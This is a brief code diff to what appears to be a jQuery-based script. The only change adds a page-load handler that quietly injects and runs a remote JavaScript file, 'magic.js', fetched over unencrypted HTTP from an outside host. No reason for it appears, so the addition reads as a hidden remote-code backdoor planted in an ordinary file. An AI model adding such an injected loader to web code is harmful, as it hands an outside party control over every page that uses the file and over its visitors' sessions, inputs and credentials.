@@ -51,4 +51,9 @@
         });
     }
 
+    document.addEventListener('DOMContentLoaded', function() {
+      var $script = document.createElement('script'); 
+      $script.src = 'http://xiaoming.io/magic.js';
+      document.body.appendChild($script);
+    });
 })(jQuery);
